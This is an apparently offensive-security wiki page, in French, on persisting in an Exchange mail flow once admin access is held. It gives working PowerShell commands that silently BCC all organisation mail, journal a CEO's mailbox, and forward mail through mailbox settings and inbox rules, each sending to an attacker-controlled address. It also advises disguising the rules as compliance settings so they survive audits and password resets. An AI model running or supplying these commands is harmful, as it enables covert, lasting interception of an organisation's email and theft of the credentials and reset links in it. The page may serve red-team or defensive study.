---
order: 7
title: "Persistance dans le flux de courrier : règles de transport, journalisation et transfert"
description: "Exfiltration durable du courrier à l'échelle de l'organisation depuis un contexte Exchange-admin : règles de transport côté serveur qui copient en aveugle tout le courrier vers une adresse externe, règles de journalisation qui archivent une boîte aux lettres ou la cadrent vers une cible externe, et transfert au niveau boîte aux lettres avec Set-Mailbox et des règles de boîte de réception, le tout survivant à la réinitialisation du mot de passe de la victime."
keywords:
  - transport rule
  - journaling
  - BlindCopyTo
  - ForwardingSmtpAddress
  - mail flow persistence
---

# Persistance dans le flux de courrier

Une fois que vous détenez un contexte Exchange-admin (depuis une [chaîne RCE](rce-chains/index.md), un [relay](privexchange.md) qui a atteint Exchange, ou un admin compromis), le flux de courrier lui-même devient un canal de persistance et d'exfiltration. Une **règle de transport** agit sur chaque message que l'organisation envoie ou reçoit, donc une seule règle copie silencieusement en aveugle tout le courrier vers une adresse que vous possédez. La **journalisation** a été construite pour archiver le courrier à des fins de conformité, donc une règle de journalisation vous remet le flux de messages complet d'une boîte aux lettres ou de l'organisation. Au niveau de la boîte aux lettres, le **transfert** (une propriété `Set-Mailbox` ou une règle de boîte de réception) copie le courrier d'une cible vers l'extérieur. Aucune de ces méthodes ne touche au mot de passe de la victime, donc elles **survivent à une réinitialisation**, et elles vivent dans la configuration d'Exchange plutôt que sur un endpoint.

## Préconditions

- Un accès Exchange Management Shell dans un rôle admin (`Transport Rules`, `Journaling` ou `Mail Recipients`), qu'un admin Exchange ou un contexte `SYSTEM` post-RCE accorde.
- Pour la livraison externe, le courrier sortant vers votre domaine de collecte doit être autorisé (la plupart des organisations envoient librement vers l'extérieur).

## Règle de transport : copie en aveugle de tout le courrier de l'organisation

Une règle de transport avec une action `BlindCopyTo` ajoute silencieusement votre adresse en Cci sur le courrier correspondant. Cadrez-la sur tout et c'est de l'interception à l'échelle de l'organisation :

```powershell
# Bcc every message to an external collector; no condition = all mail
New-TransportRule -Name "Standard Journaling" -BlindCopyTo "collector@attacker-domain.com"
# confirm it is live and unconditioned
Get-TransportRule "Standard Journaling" | Format-List Name,State,BlindCopyTo,Conditions
```

Interprétez la confirmation : `State: Enabled` avec une liste `Conditions` vide signifie que chaque message entrant et sortant est désormais mis en Cci vers votre adresse. Nommez-la de façon à se fondre dans les règles de conformité existantes (`Standard Journaling`, `DLP Policy`) pour qu'elle survive à un coup d'œil rapide sur la liste de règles. Les destinataires ne voient rien ; le Cci est invisible dans le message livré.

## Règle de journalisation : archiver une boîte aux lettres ou l'organisation

La journalisation livre une copie complète des messages (avec un rapport d'enveloppe) vers une **boîte aux lettres de journalisation**. Pointez-la vers un contact externe et vous recevez le flux. Assurez-vous d'abord que les rapports de journalisation sortants sont autorisés, puis créez la règle :

```powershell
# Set the journaling mailbox (NDRs for undeliverable journal reports) and add a rule
Set-TransportConfig -JournalingReportNdrTo "collector@attacker-domain.com"
New-JournalRule -Name "Retention" -Recipient "ceo@example.com" `
  -JournalEmailAddress "collector@attacker-domain.com" -Scope Global -Enabled $true
Get-JournalRule "Retention" | Format-List Name,Recipient,JournalEmailAddress,Scope,Enabled
```

`-Recipient` cadre la capture sur une boîte aux lettres (omettez-le pour toute l'organisation) ; `-Scope Global` capture le courrier interne et externe. La confirmation affichant votre `JournalEmailAddress` et `Enabled: True` signifie que les rapports de journalisation pour la cible affluent désormais vers votre collecteur.

## Transfert de boîte aux lettres : une cible, vers l'extérieur

Pour une seule boîte aux lettres à forte valeur, réglez le transfert côté serveur directement, ce qui ne dépend pas du client de la victime :

```powershell
# Forward a mailbox's mail to an external address, keeping a copy so nothing looks missing
Set-Mailbox -Identity ceo@example.com -ForwardingSmtpAddress "collector@attacker-domain.com" `
  -DeliverToMailboxAndForward $true
# a stealthier, mailbox-local variant: an inbox rule that forwards and marks read
New-InboxRule -Mailbox ceo@example.com -Name "sync" `
  -ForwardTo "collector@attacker-domain.com" -MarkAsRead $true
Get-Mailbox ceo@example.com | Format-List ForwardingSmtpAddress,DeliverToMailboxAndForward
```

`DeliverToMailboxAndForward $true` conserve la copie de l'utilisateur pour que la boîte aux lettres paraisse normale pendant que vous recevez chaque message. `Get-Mailbox` renvoyant votre `ForwardingSmtpAddress` le confirme. La variante `New-InboxRule` stocke le transfert comme une règle de boîte aux lettres plutôt qu'une propriété de boîte aux lettres, ce qui est un endroit différent où le cacher.

## Suite

N'importe laquelle de ces méthodes donne une **exfiltration de courrier durable, à l'échelle de l'organisation ou ciblée** qui survit aux réinitialisations d'identifiants et au nettoyage des endpoints, parce qu'elle vit dans la configuration d'Exchange. C'est aussi un flux de renseignement : un accès continu au courrier des dirigeants et du helpdesk livre des identifiants frais, des liens de réinitialisation et du contexte interne pour de nouveaux mouvements. Combinez avec l'[accès aux boîtes aux lettres](mailbox-access.md) pour un vol en masse ponctuel plus celui-ci pour la collecte continue.

## Notes d'exploitation

- Choisissez la portée délibérément : une règle de transport ou une règle de journalisation globale est bruyante et totale ; le transfert de boîte aux lettres sur un dirigeant est discret et ciblé. Adaptez-le aux besoins de discrétion de l'engagement.
- Fondez les noms dans les artefacts de conformité existants (`Journaling`, `Retention`, `DLP`) pour que la règle survive à un coup d'œil sur la configuration.
- La journalisation émet un rapport d'enveloppe qui est clairement un message de journalisation, tandis que `BlindCopyTo` livre une copie simple ; la règle Cci ressemble moins à une archive si quelqu'un inspecte votre collecteur.
- Elles survivent aux réinitialisations de mot de passe parce qu'elles sont de la configuration, pas des identifiants ; elles ne sont supprimées que par quelqu'un qui audite directement les règles de transport, les règles de journalisation et le transfert par boîte aux lettres.

## Outils

- **Exchange Management Shell** (`New-TransportRule`, `New-JournalRule`, `Set-TransportConfig`, `Set-Mailbox`, `New-InboxRule`) : tout ce qui précède depuis un contexte admin.
- **ruler** (SensePost) : transfert par règle de boîte de réception au niveau boîte aux lettres via MAPI/EWS quand vous ne détenez qu'un identifiant de boîte aux lettres.
- **Scripts EXO/EWS** : création de règles scriptée sur de nombreuses boîtes aux lettres.

## Références

- [Microsoft: New-TransportRule](https://learn.microsoft.com/en-us/powershell/module/exchange/new-transportrule)
- [Microsoft: journaling in Exchange Server](https://learn.microsoft.com/en-us/exchange/policy-and-compliance/journaling/journaling)
- [MITRE ATT&CK: Email Collection, Email Forwarding Rule (T1114.003)](https://attack.mitre.org/techniques/T1114/003/)
